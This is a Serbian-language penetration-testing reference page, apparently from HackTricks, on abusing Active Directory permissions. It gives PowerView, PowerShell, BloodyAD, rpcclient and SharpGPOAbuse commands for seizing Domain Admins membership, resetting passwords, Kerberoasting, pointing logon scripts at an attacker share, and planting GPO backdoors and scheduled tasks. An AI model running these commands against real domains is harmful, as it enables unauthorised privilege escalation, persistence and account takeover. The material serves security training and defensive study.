# Zloupotreba Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Ova stranica je uglavnom rezime tehnika iz** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **i** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Za više detalja, pogledajte originalne članke.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

Ova privilegija daje napadaču punu kontrolu nad ciljnim korisničkim nalogom. Nakon što se `GenericAll` prava potvrde korišćenjem komande `Get-ObjectAcl`, napadač može:

- **Promeniti lozinku ciljanog naloga**: Korišćenjem `net user <username> <password> /domain`, napadač može resetovati lozinku korisnika.
- **Targeted Kerberoasting**: Dodelite SPN korisničkom nalogu da bi postao kerberoastable, zatim koristite Rubeus i targetedKerberoast.py da izvučete i pokušate da razbijete ticket-granting ticket (TGT) hashes.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Onemogućite pre-authentication za korisnika, čime njihov nalog postaje ranjiv na ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll prava na grupi**

Ova privilegija omogućava napadaču da manipuliše članstvima grupa ako ima `GenericAll` prava na grupi kao što je `Domain Admins`. Nakon identifikovanja distinguished name grupe pomoću `Get-NetGroup`, napadač može:

- **Dodati sebe u Domain Admins grupu**: Ovo se može uraditi putem direktnih komandi ili korišćenjem modula kao što su Active Directory ili PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Sa Linuxa takođe možete iskoristiti BloodyAD da dodate sebe u proizvoljne grupe kada imate GenericAll/Write membership nad njima. Ako je ciljna grupa ugnježdena u “Remote Management Users”, odmah ćete dobiti WinRM pristup na hostovima koji poštuju tu grupu:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Imanje ovih privilegija na objektu računara ili na korisničkom nalogu omogućava:

- **Kerberos Resource-based Constrained Delegation**: Omogućava preuzimanje kontrole nad objektom računara.
- **Shadow Credentials**: Iskoristite ovu tehniku za lažno predstavljanje računara ili korisničkog naloga iskorišćavanjem privilegija za kreiranje shadow credentials.

## **WriteProperty on Group**

Ako korisnik ima `WriteProperty` prava na sve objekte za određenu grupu (npr. `Domain Admins`), može:

- **Dodavanje sebe u Domain Admins grupu**: Moguće kombinovanjem komandi `net user` i `Add-NetGroupUser`; ova metoda omogućava eskalaciju privilegija u okviru domena.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Ova privilegija omogućava napadačima da se dodaju u određene grupe, kao što su `Domain Admins`, putem komandi koje direktno manipulišu članstvom u grupi. Korišćenje sledeće sekvence komandi omogućava dodavanje sebe:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Slična privilegija, omogućava napadačima da sebe direktno dodaju u grupe menjanjem svojstava grupa ako imaju pravo `WriteProperty` nad tim grupama. Potvrda i izvršenje ove privilegije se vrše pomoću:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Imati `ExtendedRight` nad korisnikom za `User-Force-Change-Password` omogućava resetovanje lozinki bez poznavanja trenutne lozinke. Proveru ovog prava i njegovo iskorišćavanje moguće je izvršiti putem PowerShell ili alternativnih alata komandne linije, koji nude više metoda za resetovanje korisničke lozinke, uključujući interaktivne sesije i one-linere za neinteraktivna okruženja. Komande se kreću od jednostavnih PowerShell poziva do korišćenja `rpcclient` na Linuxu, demonstrirajući svestranost attack vectors.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

Ako napadač otkrije da ima `WriteOwner` prava nad grupom, može promeniti vlasništvo grupe na sebe. Ovo je posebno značajno kada je u pitanju grupa `Domain Admins`, jer promena vlasništva omogućava širu kontrolu nad atributima grupe i njenim članstvom. Proces podrazumeva identifikaciju ispravnog objekta pomoću `Get-ObjectAcl`, a zatim korišćenje `Set-DomainObjectOwner` za izmenu vlasnika, bilo preko SID-a ili imena.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Ova dozvola omogućava napadaču da menja korisnička svojstva. Konkretno, sa pristupom `GenericWrite`, napadač može promeniti putanju logon skripte korisnika kako bi izvršio maliciozni skript prilikom prijave korisnika. Ovo se postiže korišćenjem komande `Set-ADObject` za ažuriranje svojstva `scriptpath` ciljanog korisnika tako da pokazuje na napadačev skript.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Sa ovom privilegijom, napadači mogu manipulirati članstvom u grupi, na primer dodavanjem sebe ili drugih korisnika u određene grupe. Ovaj proces uključuje kreiranje objekta kredencijala, korišćenje tog objekta za dodavanje ili uklanjanje korisnika iz grupe i proveru promena članstva pomoću PowerShell komandi.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Owning an AD object i imati `WriteDACL` privilegije na njemu omogućava napadaču da sebi dodeli `GenericAll` privilegije nad objektom. Ovo se postiže manipulacijom ADSI, što omogućava potpunu kontrolu nad objektom i mogućnost izmene njegovih članstava u grupama. Ipak, postoje ograničenja prilikom pokušaja iskorišćavanja ovih privilegija korišćenjem Active Directory modula `Set-Acl` / `Get-Acl` cmdleta.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replikacija na domenu (DCSync)**

DCSync napad koristi specifične dozvole za replikaciju na domenu da bi oponašao Domain Controller i sinhronizovao podatke, uključujući korisničke kredencijale. Ova moćna tehnika zahteva dozvole poput `DS-Replication-Get-Changes`, što napadačima omogućava da izvuku osetljive informacije iz AD okruženja bez direktnog pristupa Domain Controller-u. [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Delegirani pristup za upravljanje Group Policy Objects (GPOs) može predstavljati značajne sigurnosne rizike. Na primer, ako je korisniku kao što je `offense\spotless` dodeljeno pravo upravljanja GPO-ima, može imati privilegije kao što su **WriteProperty**, **WriteDacl**, i **WriteOwner**. Ove dozvole se mogu zloupotrebiti u zlonamerne svrhe, što se može identifikovati pomoću PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerate GPO Permissions

Da biste identifikovali pogrešno konfigurisanе GPO-ove, PowerSploit cmdlet-ovi se mogu nizati. Ovo omogućava otkrivanje GPO-ova kojima konkretan korisnik ima prava upravljanja: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: Moguće je utvrditi na koje računare je određeni GPO primenjen, što pomaže da se razume obim potencijalnog uticaja. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: Da biste videli koje su politike primenjene na određeni računar, mogu se koristiti komande poput `Get-DomainGPO`.

**OUs with a Given Policy Applied**: Identifikacija organizational units (OUs) koje su pogođene određenom politikom može se izvršiti pomoću `Get-DomainOU`.

Takođe možete koristiti alat [**GPOHound**](https://github.com/cogiceo/GPOHound) da enumerišete GPOs i pronađete probleme u njima.

### Zloupotreba GPO - New-GPOImmediateTask

Pogrešno konfigurisani GPO-i mogu se iskoristiti za izvršavanje koda, na primer kreiranjem immediate scheduled task-a. Ovo se može iskoristiti za dodavanje korisnika u lokalnu grupu administrators na pogođenim mašinama, značajno povećavajući privilegije:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy module, ako je instaliran, omogućava kreiranje i povezivanje novih GPOs, kao i podešavanje preferencija poput vrednosti registra za izvršavanje backdoors na pogođenim računarima. Ova metoda zahteva da GPO bude ažuriran i da se korisnik prijavi na računar da bi došlo do izvršenja:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse nudi metod za zloupotrebu postojećih GPOs dodavanjem zadataka ili izmenom podešavanja bez potrebe za kreiranjem novih GPOs. Ovaj alat zahteva izmenu postojećih GPOs ili korišćenje RSAT alata za kreiranje novih pre primene izmena:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Prisilno ažuriranje politike

Ažuriranja GPO obično se dešavaju otprilike na svakih 90 minuta. Da biste ubrzali ovaj proces, naročito nakon unošenja izmene, na ciljnom računaru se može koristiti komanda `gpupdate /force` da bi se primoralo trenutno ažuriranje politike. Ova komanda osigurava da se sve izmene GPO primene bez čekanja na naredni automatski ciklus ažuriranja.

### Ispod haube

Pregledom Zakazanih zadataka za određeni GPO, kao što je `Misconfigured Policy`, može se potvrditi dodavanje zadataka poput `evilTask`. Ovi zadaci se kreiraju putem skripti ili komandno-linijskih alata sa ciljem izmene ponašanja sistema ili eskalacije privilegija.

Struktura zadatka, prikazana u XML konfiguracionom fajlu koji generiše `New-GPOImmediateTask`, opisuje specifikacije zakazanog zadatka — uključujući komandu koja će se izvršiti i okidače. Ovaj fajl predstavlja način na koji su zakazani zadaci definisani i upravljani unutar GPO-a, pružajući metod za izvršavanje proizvoljnih komandi ili skripti kao deo sprovođenja politike.

### Korisnici i grupe

GPO takođe omogućavaju manipulaciju članstvima korisnika i grupa na ciljanim sistemima. Direktnim izmenama policy fajlova Users and Groups, napadači mogu dodavati korisnike u privilegovane grupe, kao što je lokalna grupa `administrators`. To je moguće kroz delegiranje prava upravljanja GPO-om, koje dozvoljava izmene policy fajlova kako bi se uključili novi korisnici ili promenilo članstvo u grupama.

XML konfiguracioni fajl za Users and Groups prikazuje kako se ove promene implementiraju. Dodavanjem unosa u ovaj fajl, određenim korisnicima se može dodeliti povišeni nivo privilegija na pogođenim sistemima. Ova metoda pruža direktan način za eskalaciju privilegija kroz manipulaciju GPO-ima.

Pored toga, mogu se razmotriti i dodatne metode za izvršavanje koda ili održavanje pristupa, kao što su korišćenje logon/logoff skripti, izmena registrskih ključeva za autorun, instalacija softvera putem .msi fajlova, ili uređivanje konfiguracija servisa. Ove tehnike pružaju različite puteve za održavanje pristupa i kontrolu ciljnih sistema kroz zloupotrebu GPO-ova.

## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
